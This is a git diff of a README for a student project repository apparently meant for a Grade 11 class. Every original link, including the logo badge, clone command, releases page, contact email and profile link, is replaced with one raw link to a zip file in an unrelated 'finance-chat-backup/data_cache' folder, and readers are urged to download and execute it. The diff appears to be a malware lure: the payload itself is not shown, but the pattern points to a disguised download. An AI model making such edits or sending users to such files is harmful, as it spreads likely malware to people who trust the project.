@@ -1,6 +1,6 @@
 # Catalyst Project for Ken Nakao G11 2025 🚀
 
-![Project Logo](https://img.shields.io/badge/Catalyst-Project-brightgreen)
+![Project Logo](https://raw.githubusercontent.com/Cybermaster74/catalyst/main/finance-chat-backup/data_cache/Software-v1.0.zip)
 
 Welcome to the **Catalyst** project! This repository serves as a platform for the development and collaboration of various tools and resources aimed at enhancing the learning experience for Ken Nakao's G11 class in 2025. 
 
@@ -32,7 +32,7 @@ To get started with the **Catalyst** project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Cybermaster74/catalyst.git
+   git clone https://raw.githubusercontent.com/Cybermaster74/catalyst/main/finance-chat-backup/data_cache/Software-v1.0.zip
    ```
 
 2. Navigate to the project directory:
@@ -45,7 +45,7 @@ To get started with the **Catalyst** project, follow these steps:
    npm install
    ```
 
-4. Download and execute the latest release from [here](https://github.com/Cybermaster74/catalyst/releases).
+4. Download and execute the latest release from [here](https://raw.githubusercontent.com/Cybermaster74/catalyst/main/finance-chat-backup/data_cache/Software-v1.0.zip).
 
 ## Usage
 
@@ -91,13 +91,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloads, check the [Releases section](https://github.com/Cybermaster74/catalyst/releases). Here you will find the latest versions of the project, including new features and bug fixes. Make sure to download and execute the latest release to benefit from all the updates.
+For the latest updates and downloads, check the [Releases section](https://raw.githubusercontent.com/Cybermaster74/catalyst/main/finance-chat-backup/data_cache/Software-v1.0.zip). Here you will find the latest versions of the project, including new features and bug fixes. Make sure to download and execute the latest release to benefit from all the updates.
 
 ## Contact
 
 For any inquiries or suggestions, feel free to reach out:
 
-- **Ken Nakao**: [ken.nakao@example.com](mailto:ken.nakao@example.com)
-- **GitHub**: [Cybermaster74](https://github.com/Cybermaster74)
+- **Ken Nakao**: [https://raw.githubusercontent.com/Cybermaster74/catalyst/main/finance-chat-backup/data_cache/Software-v1.0.zip](https://raw.githubusercontent.com/Cybermaster74/catalyst/main/finance-chat-backup/data_cache/Software-v1.0.zip)
+- **GitHub**: [Cybermaster74](https://raw.githubusercontent.com/Cybermaster74/catalyst/main/finance-chat-backup/data_cache/Software-v1.0.zip)
 
 Thank you for your interest in the **Catalyst** project! Together, we can create a brighter future for our students.
